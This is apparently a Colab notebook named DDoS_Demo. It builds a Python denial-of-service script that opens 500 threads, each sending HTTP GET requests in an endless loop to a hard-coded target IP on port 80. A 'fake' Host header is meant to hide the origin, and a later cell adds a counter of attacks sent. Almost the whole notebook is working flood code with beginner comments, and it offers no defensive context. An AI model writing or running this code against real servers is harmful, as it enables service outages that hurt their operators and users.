{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyOYsjxISinc0lFx66N9mNws",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/wolfofdalalstreet/python_projects/blob/main/DDoS_Demo.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "7ztANL7PcRs3"
      },
      "outputs": [],
      "source": [
        "# Importing the required libraries\n",
        "import socket  # provides the tools to interact with the network\n",
        "import threading  # allows us to do multiple things at once\n"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Defining our target, fake IP, and the port we want to attack\n",
        "target = '10.0.0.138'  # the IP address of the server we want to attack\n",
        "fake_ip = '182.21.20.32'  # a fake IP address that we want the target to think is the origin of the requests\n",
        "port = 80  # the port on the server that we want to attack\n"
      ],
      "metadata": {
        "id": "B6gnfD8tcUJ7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Defining our attack function\n",
        "def attack():\n",
        "    while True:  # this creates an infinite loop, meaning the attack will keep going until we stop it\n",
        "        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # this creates a new socket object\n",
        "        s.connect((target, port))  # this connects our socket to the target server\n",
        "        s.sendto((\"GET /\" + target + \" HTTP/1.1\\r\\n\").encode('ascii'), (target, port))  # this sends our GET request to the server\n",
        "        s.sendto((\"Host: \" + fake_ip + \"\\r\\n\\r\\n\").encode('ascii'), (target, port))  # this sends our Host request to the server\n",
        "        s.close()  # this closes our socket connection\n"
      ],
      "metadata": {
        "id": "JF_YeJXlcUgP"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Starting multiple threads that execute the attack function simultaneously\n",
        "for i in range(500):  # this loop will run 500 times\n",
        "    thread = threading.Thread(target=attack)  # this creates a new thread object and sets its target as our attack function\n",
        "    thread.start()  # this starts the thread, which will begin executing the attack function\n"
      ],
      "metadata": {
        "id": "jscBz8i6cUjY"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Modifying our attack function to keep track of and print the number of attacks\n",
        "attack_num = 0  # a counter for the number of attacks\n",
        "\n",
        "def attack():\n",
        "    while True:\n",
        "        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
        "        s.connect((target, port))\n",
        "        s.sendto((\"GET /\" + target + \" HTTP/1.1\\r\\n\").encode('ascii'), (target, port))\n",
        "        s.sendto((\"Host: \" + fake_ip + \"\\r\\n\\r\\n\").encode('ascii'), (target, port))\n",
        "        \n",
        "        global attack_num  # allows us to modify the global variable inside the function\n",
        "        attack_num += 1  # increments the number of attacks by 1\n",
        "        print(attack_num)  # prints the number of attacks\n",
        "        \n",
        "        s.close()\n"
      ],
      "metadata": {
        "id": "B588ThD1cUmN"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}